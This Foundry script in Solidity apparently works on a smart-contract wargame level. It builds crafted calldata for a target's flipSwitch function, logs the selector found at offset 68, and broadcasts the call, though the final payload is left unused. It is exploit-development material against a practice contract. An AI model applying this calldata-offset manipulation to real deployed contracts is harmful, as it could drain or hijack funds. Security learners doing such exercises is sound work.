// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface ITarget {
  function flipSwitch(bytes memory _data) external;

  function switchOn() external view returns (bool);
}

contract Debug is Script, Test {
  function logData() external {
    bytes32[1] memory selector;
    emit log_named_bytes("All payload", msg.data);
    assembly {
      calldatacopy(selector, 68, 4)
    }
    emit log_named_bytes("Selector", abi.encodePacked(selector[0]));
    bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
    emit log_named_bytes("Off selector", abi.encodePacked(offSelector));
    console.log("offSelector equal?", selector[0] == offSelector);
  }

  fallback() external {
    emit log_named_bytes("Data[68:]", msg.data[68:]);
  }
}

contract Solve is Script, Test {
  address target = address(0x415cCc114B0a65532D6235654590cD2A6344d593);

  function run() public {
    vm.startBroadcast();

    bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
    bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

    emit log_named_bytes("Off selector", abi.encodePacked(offSelector));
    emit log_named_bytes("On selector", abi.encodePacked(onSelector));

    bytes memory callPayload = abi.encodeWithSignature("flipSwitch(bytes)", abi.encodePacked(offSelector));
    bytes memory finalPayload = abi.encodePacked(callPayload, offSelector);
    console.log("Payload length: %s", callPayload.length);
    emit log_named_bytes("Payload", callPayload);
    // bytes memory slice64 = callPayload[64:];
    // emit log_named_bytes("CallPayload[64:]", slice64);

    (bool success, bytes memory data) = target.call(callPayload);
    emit log_named_bytes("Data returned", data);
    // require(success, "Call failed");
    // require(ITarget(target).switchOn(), "Switch is off");

    Debug debug = new Debug();
    address(debug).call(callPayload);

    vm.stopBroadcast();
  }
}
